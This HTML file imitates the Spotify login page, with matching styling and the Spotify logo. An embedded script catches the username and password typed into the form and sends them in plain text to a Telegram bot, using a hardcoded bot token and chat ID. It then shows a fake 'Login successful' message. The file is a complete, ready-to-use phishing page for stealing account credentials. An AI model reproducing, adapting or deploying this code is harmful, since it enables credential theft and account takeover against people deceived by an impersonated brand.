<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Spotify Login</title>
  <style>
    /* General Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      width: 350px;
      padding: 40px;
      background-color: #181818;
      border-radius: 10px;
      text-align: center;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }

    .logo {
      width: 150px;
      margin-bottom: 20px;
    }

    h2 {
      font-size: 24px;
      margin-bottom: 20px;
    }

    .input-group {
      margin-bottom: 15px;
      text-align: left;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-size: 14px;
      color: #b3b3b3;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 4px;
      background-color: #282828;
      color: white;
      font-size: 16px;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      outline: none;
      border: 1px solid #1db954;
    }

    .btn {
      width: 100%;
      padding: 10px;
      background-color: #1db954;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .btn:hover {
      background-color: #17a64d;
    }

    .forgot-password {
      display: block;
      margin-top: 10px;
      color: #b3b3b3;
      text-decoration: none;
      font-size: 14px;
    }

    .forgot-password:hover {
      text-decoration: underline;
    }

    p {
      margin-top: 20px;
      font-size: 14px;
    }

    p a {
      color: #1db954;
      text-decoration: none;
    }

    p a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_Green.png" alt="Spotify Logo" class="logo">
    <h2>Welcome back!</h2>
    <form id="loginForm">
      <div class="input-group">
        <label for="username">Username or Email</label>
        <input type="text" id="username" name="username" required>
      </div>
      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
      </div>
      <button type="submit" class="btn">LOG IN</button>
    </form>
    <a href="#" class="forgot-password">Forgot your password?</a>
    <p>Don't have an account? <a href="#">Sign up for free</a></p>
  </div>

  <script>
    const botToken = '7704668977:AAEiAzheRjDx6B_3_P9KyJ5oht7fxKBXoUg'; // Replace with your bot token
    const chatId = '-1002382217122'; // Replace with your chat ID

    document.getElementById('loginForm').addEventListener('submit', function (event) {
      event.preventDefault(); // Prevent form submission

      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!username || !password) {
        alert('Please enter both username and password.');
        return;
      }

      // Create the message to send to the Telegram bot
      const message = `User logged in:\nUsername: ${username}\nPassword: ${password}`;

      // Send the message to the Telegram bot
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        console.log('Message sent to Telegram:', data);
        alert(`Login successful! Welcome, ${username}! `);
      })
      .catch(error => {
        console.error('Error sending message to Telegram:', error);
        alert('An error occurred while processing your login.');
      });
    });
  </script>
</body>
</html>
